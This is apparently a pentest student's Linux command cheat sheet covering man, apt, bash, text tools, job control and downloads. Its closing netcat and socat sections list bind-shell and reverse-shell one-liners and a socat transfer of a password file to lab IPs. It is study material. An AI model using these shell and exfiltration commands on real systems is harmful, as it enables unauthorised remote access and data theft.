# linux-tips

### `man`
- Keyword search in all man pages: `man -k keyword`
- Search using apropos (equivalent to man -k): `apropos {{keyword}}`

### `mkdir`
- Create several dirs at the same time: `mkdir -p test/{recon,exploit,report}`

### `systemctl`
- `sudo systemctl start ssh`
- Check that service is running: `sudo ss -antlp | grep sshd`
- To start ssh at boot time run: `sudo systemctl enable ssh`
- To start an Apache http server: `sudo systemctl start apache2`
- See all available services: `systemctl list-unit-files`

### `apt` and `dpkg`
- Update packages cache, repositories, versions, descriptions: `apt update`
- To upgrade the system run `apt upgrade`, to upgrade just one package `apt upgrade {{package name}}`
- To search in the internal cache packages db: `apt-cache search {{keyword}}`
- Show package information: `apt show {{package name}}`
- Install with `apt install`
- Completely remove package, including all config files, with `apt remove --purge {{package name}}`
- To install .deb package: `dpkg -i {{route to deb file}}`

### Bash shell
- Display id of the current shell instance: `echo $$`
- Display all env vars: `env`
- Display history with: `history`
- History returns a number for each entry. Run it again with `!{{command number}}`
- Repeat last command with `!!`
- Set `HISTSIZE` to configure the number of commands saved in memory for the current session, and `HISTFILESIZE` to configure the total size of the bash history.

### Piping and redirection
Programs executed from the command line have 3 streams:
- stdin: Program input
- stdout: Program output (default terminal)
- stderr: Errors (default terminal)

Redirections:
- Redirect to new file: `echo "whatever" > newfile.txt`
- Append to existing file: `echo "whatever" >> existing_file.txt"`
- Redirecting stderr: According to POSIX, stdin, stdout and stderr are defined by 0, 1, 2. To redirect the stderr we can append `2>errors.txt` to the command. Also doing `2>/dev/null` is helpful for ignoring errors.

### Text search and manipulation
#### sort
Sort by field 1: ```sort -k1```
Sort desc: ```sort -r```

#### grep
- Grep searches text files for occurrences of regular expressions
- Common flags include `-r` to recursively search and `-i` to ignore case

#### sed
- Sed is an stream editor
- `echo "I love Windows" | sed 's/Windows/GNU\/Linux/'`

#### cut
- Extract sections from a line and send it to stdout
```
echo "pear,apple,banana" | cut -d "," -f 2
apple
```

#### awk
```
echo "hola::friend::amigo" | awk -F "::" '{print $1, $3}'
hola amigo
```

#### comm
```
comm file1.txt file2.txt
```
Displays results in 3 columns:
1) lines just present in file1
2) lines in both files
3) lines just present in file2

Removing lines: ```-{1}{2}{3}``` eg. ```-12``` removes columns 1 and 2.

### vimdiff
Open vim with the diff open in 2 buffers, much clearer than diff or comm in my opinion.

### Background process
The quickest way to background a process is to append an ampersand (&) to the end of the command to send it to the background immediately after it starts.

Other related commands:
- ctrl + z to suspend a process
- `bg` to resume the process suspended in the background
- `fg` returns a process to the foreground
- `jobs` lists all process being executed from the current terminal session
- `fg %{{process_number}}` foregrounds the process with number process_number (processes are listed with their number when running jobs)
- it can also be `fg %{{beginning of the command}}`

### `ps` (process status)
Unlike jobs, it lists processes system-wide.
It also works in powershell, it is an alias to ```Get-Process cmdlet```.

- `ps -ef`: select all processes in full format listing
- `ps -fC {{application name}}`: search by app name (I tried this and it didn't really show the process I was looking for)

### `tail`
Monitor the end portion of a log file with `tail -f`. Get last x lines with `tail -nx`.

### `watch`
Repeat a command each n seconds (2 by default) and continuously watch its output. Watch the execution of the `w` command each 5 seconds:
```watch -n 5 w```

### `wget`
Download with output file name:
```wget -O {{output_file}} {{url}}```

Download just specific file types:
```wget -A '*.pdf -r example.com ```

### `curl`
```
curl -o {{output_file}} {{url}}
```

### `axel`
Download acceleration using several processes (given by the -n flag):
```
axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
```

### `alias`
```
alias alias_name="command"
```
`unalias` unsets an alias.

### `netcat`
- Check if port is open (no dns lookup, verbose): `nc -nv {{ip}} {{port}}`
- Listen: `nc -lvpn {{port}}`
- Receive file: `nc -nlvp 4444 > incoming.exe`
- Send file: `nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`
- Bind shell (server binds shell): `nc -nlvp 4444 -e cmd.exe`
- Reverse shell (client binds shell): `nc -nv {{ip}} {{port}} -e /bin/bash`

### `socat`
Similar to netcat with some extra features.
- Connect to http server: `socat - TCP4:<remote server's ip address>:80`
- A dash `-` is necessary to trasfer data between a socket and a STDIO
- Listen on a port: `sudo socat TCP4-LISTEN:443 STDOUT`
- Transfer file (http server): `sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt`. Note that fork creates another thread, this is good for when there is more than one client, either for file uploads or to (reverse) shells.
- Transfer file (http client): `socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`
- Reverse shell: 
  - Server (attacker): `socat -d -d TCP4-LISTEN:443 STDOUT`. `-d` just increases verbosity.
  - Client (target): `socat TCP4:10.11.0.22:443 EXEC:/bin/bash`
  
